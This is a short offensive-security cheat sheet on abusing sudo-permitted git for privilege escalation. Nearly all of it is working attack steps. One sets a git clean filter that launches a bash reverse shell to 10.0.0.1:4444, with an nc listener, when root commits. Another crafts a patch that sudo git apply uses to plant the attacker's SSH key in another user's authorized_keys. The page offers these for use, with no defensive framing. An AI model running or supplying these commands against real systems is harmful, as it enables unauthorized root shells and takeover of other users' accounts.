# Sudo Git Privilege Escalation

The `sudo git` command might be vulnerable to privilege escalation.

### Git Add/Commit <a href="#git-addcommit" id="git-addcommit"></a>

```
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m "commit"
```

If we can commit the git repository as root, we may be able to escalate privileges.

#### Exploitation <a href="#exploitation" id="exploitation"></a>

1. **Create a Payload**

```
echo 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' > /tmp/revshell
chmod +x /tmp/revshell
```

1. **Set Git Config**

```
# Go to the git repository
cd /opt/example
git init
echo '*.php filter=indent' > .git/info/attributes
git config filter.indent.clean /tmp/revshell
```

1. **Commit the Repository**

Before committing, we need to start a listener in local machine.

```
nc -lvnp 4444
```

Then commit with sudo.

```
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A
sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example commit -m "commit"
```

Now we should get a shell in local terminal.

### Git Apply <a href="#git-apply" id="git-apply"></a>

```
sudo /usr/bin/git apply *
```

If we can apply the patch for the git repository, we can update the content of arbitrary file.

#### Exploitation with SSH Keys <a href="#exploitation-with-ssh-keys" id="exploitation-with-ssh-keys"></a>

Assume we are currently "user1" user then we want to escalate to be "user2".\
First we create a new SSH key.

```
cd /home/user1
ssh-keygen -t rsa
Enter file in which to save the key (/home/user1/.ssh/id_rsa): id_rsa
```

New SSH keys (private/public) are generated under **`/home/user1`**.\
Next, add the content of **`id_rsa.pub`** into **`authorized_keys.`**.

```
cat /home/user1/id_rsa.pub > /home/user1/.ssh/authorized_keys
```

Then create a patch.

```
cd /home
git diff user1/.bash_history user1/.ssh/authorized_keys > /tmp/patch
```

After that, replace the name “user1” with “user2” in the patch file.

```
sed -i 's/user1/user2/g' /tmp/patch
```

Now we can apply the patch as root. This command update the target user’s ("user2") **`authorization_keys`** to allow us to login with SSH key as "user2".

```
sudo /usr/bin/git apply /tmp/patch
ssh -i /home/user1/.ssh/id_rsa user2@example.com
```
